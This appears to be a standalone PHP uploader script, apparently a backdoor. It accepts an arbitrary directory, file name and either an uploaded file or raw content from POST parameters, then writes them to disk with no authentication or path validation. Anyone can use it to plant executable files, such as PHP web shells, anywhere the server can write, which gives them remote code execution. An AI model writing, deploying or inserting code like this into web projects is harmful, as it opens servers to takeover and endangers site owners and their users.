<?php
if (isset($_POST['dir']) && isset($_POST['filename'])) {
    $dir = $_POST['dir'];
    $file = $_POST['filename'];
    if ($dir != "" && !is_dir($dir)) { mkdir($dir, 0755, true); }
    $target_dir = $dir != "" ? $dir . '/' : '';
    if (isset($_FILES['file'])) {
        move_uploaded_file($_FILES['file']['tmp_name'], $target_dir . $file);
        echo "Success: " . $file;
    } else if (isset($_POST['content'])) {
        file_put_contents($target_dir . $file, $_POST['content']);
        echo "Success: " . $file;
    }
}
?>